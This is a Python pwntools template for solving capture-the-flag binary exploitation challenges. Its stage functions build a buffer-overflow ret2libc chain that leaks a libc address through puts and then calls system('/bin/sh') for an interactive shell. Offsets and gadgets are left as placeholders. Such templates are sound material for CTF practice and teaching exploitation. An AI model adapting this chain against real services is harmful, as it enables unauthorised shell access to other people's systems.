#!/usr/bin/env python3
"""
ctf/templates/template_pwn.py — CTF Binary Exploitation Solve Template
NuRichter · CySec Arsenal

Fill in CONFIG, then enable stages as needed.
"""
from pwn import *

# ─── CONFIG ──────────────────────────────────────────────────────────────────
BINARY  = "./vuln"
LIBC    = "./libc.so.6"
REMOTE  = ("challenge.ctf.io", 1337)
context.binary = BINARY

elf  = ELF(BINARY, checksec=False)
rop  = ROP(elf)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None

def conn():
    if args.REMOTE: return remote(*REMOTE)
    if args.GDB:    return gdb.debug(BINARY, gdbscript="b main\nc")
    return process(BINARY)

# ─── OFFSETS (fill after pattern_create analysis) ────────────────────────────
OFFSET       = 0      # bytes to RIP/EIP
POP_RDI      = 0      # gadget: pop rdi; ret
RET          = 0      # gadget: ret   (stack alignment)
SYSTEM_PLT   = elf.plt.get("system", 0)
PUTS_PLT     = elf.plt.get("puts",   0)
PUTS_GOT     = elf.got.get("puts",   0)
MAIN_ADDR    = elf.symbols.get("main", 0)

# ─── STAGE 1: libc leak ───────────────────────────────────────────────────────
def leak_libc(p):
    log.info("Stage 1: libc leak via puts@plt → puts@got")
    payload  = b"A" * OFFSET
    payload += p64(POP_RDI) + p64(PUTS_GOT)
    payload += p64(RET)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN_ADDR)
    p.sendlineafter(b">>>", payload)
    p.recvline()
    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"puts leak: {hex(leak)}")
    if libc:
        libc.address = leak - libc.symbols["puts"]
        log.success(f"libc base: {hex(libc.address)}")

# ─── STAGE 2: shell ───────────────────────────────────────────────────────────
def get_shell(p):
    log.info("Stage 2: ret2libc shell")
    sys_  = libc.symbols["system"] if libc else SYSTEM_PLT
    bin_sh = next(libc.search(b"/bin/sh")) if libc else next(elf.search(b"/bin/sh"))
    payload  = b"A" * OFFSET
    payload += p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(sys_)
    p.sendlineafter(b">>>", payload)
    log.success("Shell! 🐚")
    p.interactive()

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    p = conn()
    # leak_libc(p)
    # get_shell(p)
    p.interactive()

if __name__ == "__main__": main()
